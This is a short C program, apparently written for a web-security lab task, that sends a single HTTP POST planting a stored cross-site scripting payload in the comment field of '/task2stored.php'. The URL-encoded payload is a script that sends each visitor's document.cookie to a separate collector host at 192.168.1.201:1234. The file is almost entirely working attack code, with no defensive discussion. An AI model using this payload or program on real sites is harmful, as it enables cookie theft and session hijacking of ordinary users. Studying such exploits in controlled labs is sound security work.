#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

const char* VULNERABLE_PAGE = "/task2stored.php";
const char* PAYLOAD =
    "%3Cscript%3Efetch(%22http%3A%2F%2F192.168.1.201%3A1234%2Fsteal%3Fc%3D%22%20%2B%20document.cookie)%3C%2Fscript%3E";
const char* HTTP_POST_REQUEST = "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n"
        "comment=%s";
const char* COMMENT_FIELD_PREFIX = "comment=";

#define WEB_SERVER_IP "192.168.1.203"
#define WEB_SERVER_PORT 80
#define REQUEST_SIZE 1024

// Builds and sends a minimal HTTP POST request to the web server that inserts
// the stored-XSS payload into the "comment" field of the vulnerable page
void send_http_request() {
    size_t content_len = strlen(PAYLOAD) + strlen(COMMENT_FIELD_PREFIX);

    // build HTTP POST request
    char req[REQUEST_SIZE];
    int n = snprintf(req, sizeof(req), HTTP_POST_REQUEST,
        VULNERABLE_PAGE, WEB_SERVER_IP, content_len, PAYLOAD);

    if (n < 0 || (size_t)n >= sizeof(req)) {
        exit(EXIT_FAILURE);
    }

    // create a socket to connect to the web server
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(WEB_SERVER_PORT);
    inet_pton(AF_INET, WEB_SERVER_IP, &addr.sin_addr);

    if (connect(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        exit(EXIT_FAILURE);
    }

    // socket options as required in the forum
    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt,
    sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEADDR) failed...\n");
        close(server_fd);
        exit(1);
    }
    opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEPORT, &opt,
    sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEPORT) failed...\n");
        close(server_fd);
        exit(1);
    }

    // send the http request to the web server
    ssize_t sent = send(server_fd, req, (size_t)n, 0);
    if (sent < 0) {
        exit(EXIT_FAILURE);
    }

    // close the socket
    close(server_fd);
}

// Sends a single HTTP POST request that inserts the stored-XSS payload
// into the vulnerable page and then exits
int main() {
    send_http_request();
}
